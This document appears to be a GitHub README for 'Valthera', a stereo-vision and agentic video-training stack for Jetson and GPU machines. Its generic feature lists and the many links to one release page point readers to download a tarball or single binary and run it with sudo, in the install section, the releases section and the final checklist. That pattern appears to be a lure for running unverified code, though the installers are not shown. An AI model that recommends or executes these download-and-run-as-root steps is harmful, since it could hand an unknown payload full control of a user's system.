# Valthera — Open Stereo Vision Stack for GPU & Edge AI

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/LILCRAKER/valthera/releases)

High-performance open-source stack for stereo vision, depth, and video classifiers. It combines stereo camera hardware, GPU pipelines, and an AI agent that manages few-shot and self-supervised training for video classifiers.

- Repository: valthera
- Topics: agentic-ai, aws-sam, computer-vision, depth-estimation, docker, edge-ai, few-shot-learning, gpu, jetson-nano, langgraph, llm, open-source, open-source-hardware, pytorch, react, robotics, self-supervised-learning, stereo-vision, video-processing, vjepa

![Stereo rig](https://images.unsplash.com/photo-1526178611642-6f5e6b5e3b4f?auto=format&fit=crop&w=1200&q=60)

Table of contents
- Features
- Hardware
- Software stack
- Architecture overview
- Quick start
- Installation (download and execute)
- Run and test
- Training workflows
- Agent design (agentic AI)
- APIs and UI
- Example scripts
- Development and contributing
- Releases and downloads
- License and attribution

Features
- Stereo capture pipeline with synchronized left/right streams.
- GPU-accelerated depth estimation and video processing.
- Self-supervised and few-shot training flows for video classifiers.
- Agent that controls data collection, labeling, model trials, and deployment.
- Edge-first design with support for Jetson Nano and Docker GPU nodes.
- React-based monitoring UI and LangGraph-linked orchestration.
- Integrates VJepa-style self-supervision and PyTorch training loops.

Hardware
- Stereo camera rigs (global-shutter or rolling-shutter options).
- Mounts and wiring for open-source build.
- Jetson Nano and x86 GPU nodes supported.
- Power and enclosure guidelines in the docs folder.

Hardware image
![Jetson Nano and camera](https://upload.wikimedia.org/wikipedia/commons/0/0b/NVIDIA_Jetson_Nano.jpg)

Software stack
- Core frameworks
  - PyTorch: training and inference.
  - CUDA/cuDNN: GPU acceleration.
  - OpenCV: capture and basic processing.
  - VJepa components for self-supervised pretraining.
- Orchestration
  - LangGraph for agent flow control.
  - AWS SAM for optional cloud functions and event triggers.
  - Docker for containerized deployment.
- UI
  - React app for live view, labeling, and agent controls.
- Utilities
  - Depth estimation models (stereo and monocular fallback).
  - Video pipelines for clip extraction and augmentation.
  - Dataset manager with versioned annotations.

Architecture overview
- Edge device (Jetson, GPU box)
  - Stereo cameras -> capture service -> local ring buffer
  - GPU processing service -> depth, feature maps, embeddings
  - Agent runtime -> selects samples, triggers labeling, runs trials
- Control and cloud
  - Optional AWS SAM functions for long-term storage and analytics
  - LangGraph orchestration for multi-node experiments
- UI
  - React dashboard -> live camera view, label tools, agent console

Quick start (overview)
1. Prepare hardware: stereo cameras and Jetson or GPU node.
2. Download the latest release from Releases and run the installer.
3. Start Docker containers or install native packages.
4. Launch the capture service, GPU pipeline, agent, and UI.
5. Use the UI to label a few clips or feed a small seed set.
6. Start a few-shot training job and watch the agent iterate.

Installation (download and execute)
- The project ships prebuilt release bundles. Download the release file that matches your platform and execute the installer.
- Visit the Releases page, download the archive, and run the install script:
  - Releases: https://github.com/LILCRAKER/valthera/releases
- Example (Linux x86 GPU):
  - wget https://github.com/LILCRAKER/valthera/releases/download/v1.0/valthera-linux-x86-gpu.tar.gz
  - tar -xzf valthera-linux-x86-gpu.tar.gz
  - cd valthera
  - sudo ./install.sh
- Example (Jetson Nano):
  - Download the Jetson bundle from the Releases page and run:
  - tar -xzf valthera-jetson.tar.gz
  - cd valthera
  - sudo ./install-jetson.sh
- If the installer is a single executable, mark it executable and run:
  - chmod +x valthera-installer
  - sudo ./valthera-installer

System requirements
- For GPU nodes
  - CUDA 11+ compatible GPU with 8GB+ VRAM recommended for model training.
  - 16 GB RAM or more.
  - Docker 20.x or later (if using containers).
- For Jetson Nano
  - Jetson Nano 4GB recommended.
  - JetPack matching the release build.
  - USB3 or CSI2 stereo camera pair.

Run and test
- Start services with Docker Compose:
  - docker compose up -d
- Or start native services:
  - ./bin/start-capture.sh
  - ./bin/start-gpu-pipeline.sh
  - ./bin/start-agent.sh
  - ./bin/start-ui.sh
- Verify capture
  - Visit http://<edge-ip>:3000
  - See left/right streams and depth overlay.
- Run a sample inference:
  - python tools/infer_clip.py --input sample.mp4 --model models/shot_classifier.pth

Training workflows
- Self-supervised pretrain (VJepa-style)
  - The pipeline performs patch-based masking and cross-view prediction.
  - Use pretrain script:
    - python train/pretrain_vjepa.py --data /data/raw --epochs 50 --gpus 1
- Few-shot classifier
  - Use the agent to collect N-shot examples per class.
  - Train with embedded regularization and temporal augmentations:
    - python train/few_shot.py --shots 5 --classes 10 --epochs 30
- Video classifier fine-tune
  - Convert clips to frame sequences.
  - Use a time-distributed backbone and temporal pooling.
  - Train:
    - python train/video_finetune.py --data /data/claims --batch 8 --gpus 1

Agent design (agentic AI)
- The agent uses LangGraph flows for decision logic.
- It runs cycles:
  - Query recent captures and embeddings.
  - Select uncertain clips and request labels.
  - Schedule model trials with hyperparam variations.
  - Evaluate and deploy the best model to the inference service.
- The agent runs with modular policies. You can add policies in /agent/policies.
- It supports LLMS for label suggestion and active learning prompts.

APIs and UI
- REST API endpoints
  - POST /api/capture/start
  - GET /api/streams/left
  - GET /api/depth/latest
  - POST /api/labels
  - POST /api/agent/trigger
- Web UI
  - Live streams with synchronized left/right view.
  - Depth overlay toggle.
  - Label panel with temporal scrubber.
  - Agent console showing trials, status, and metrics.

Example scripts
- Capture a 10s clip:
  - python tools/capture_clip.py --duration 10 --out clips/clip1.mp4
- Extract frames:
  - python tools/extract_frames.py --in clips/clip1.mp4 --out frames/clip1
- Run inference on a clip:
  - python tools/run_inference.py --model models/latest.pth --clip clips/clip1.mp4
- Launch hyperparameter sweep:
  - python tools/sweep.py --config agent/sweep_config.yaml

Development and contributing
- Code layout
  - /capture — camera drivers and sync
  - /pipeline — GPU kernels, depth and embeddings
  - /agent — LangGraph flows and policies
  - /ui — React dashboard
  - /tools — utility scripts
  - /models — model checkpoints and exporters
- Local dev
  - python -m venv .venv
  - source .venv/bin/activate
  - pip install -r requirements-dev.txt
  - npm install --prefix ui
- Tests
  - Run unit tests:
    - pytest tests
  - Run integration tests:
    - pytest tests/integration --capture=no
- Contribution rules
  - Fork and branch for features.
  - Open a PR that targets develop.
  - Include tests and a short changelog entry.
  - Keep commits small and focused.

Releases and downloads
- Release bundles live on the Releases page. Download the file that matches your platform and run the installer.
- Visit the releases page to find platform-specific installers:
  - https://github.com/LILCRAKER/valthera/releases
- Each release includes:
  - Platform bundles (x86 GPU, Jetson)
  - Sample datasets and prebuilt models
  - Change notes and migration steps

Badges and topics
- Topics: agentic-ai, aws-sam, computer-vision, depth-estimation, docker, edge-ai, few-shot-learning, gpu, jetson-nano, langgraph, llm, open-source, open-source-hardware, pytorch, react, robotics, self-supervised-learning, stereo-vision, video-processing, vjepa
- Use the topics as search keywords on GitHub and registries.

Common troubleshooting
- If the capture service shows no frames:
  - Check camera power and cable.
  - Verify device nodes in /dev.
  - Confirm permissions for the capture user.
- If GPU kernels fail:
  - Verify CUDA and driver versions match the binaries.
  - Rebuild the pipeline with the local CUDA version.
- If the UI shows stale metrics:
  - Restart the agent and force a status refresh.

Maintenance and upgrade
- Follow the Releases page for upgrade steps and migration notes.
- Back up /data and /models before any upgrade.
- Use the installer from the release bundle to perform safe upgrades.

License and attribution
- This project uses an open-source license. See LICENSE in the repo for details.
- Third-party components:
  - PyTorch, OpenCV, LangGraph, React, and other libraries under their own licenses.

Contact and links
- Issues: open an issue on GitHub.
- Discussions: use the repository Discussions tab for design talks.
- Releases: check and download bundles on the Releases page:
  - https://github.com/LILCRAKER/valthera/releases

Emojis
- Use these in the UI and docs to signal state:
  - 🔴 capturing
  - 🟢 streaming
  - ⚙️ agent running
  - 📦 release available

Images and assets
- Place production images in /docs/assets.
- Use CC0 or project-owned photos for public displays.

End user checklist
- Confirm hardware works and streams left/right frames.
- Confirm CUDA drivers match the release.
- Download the proper release bundle and execute the included installer.
- Start the agent and watch it collect and train models on labeled clips.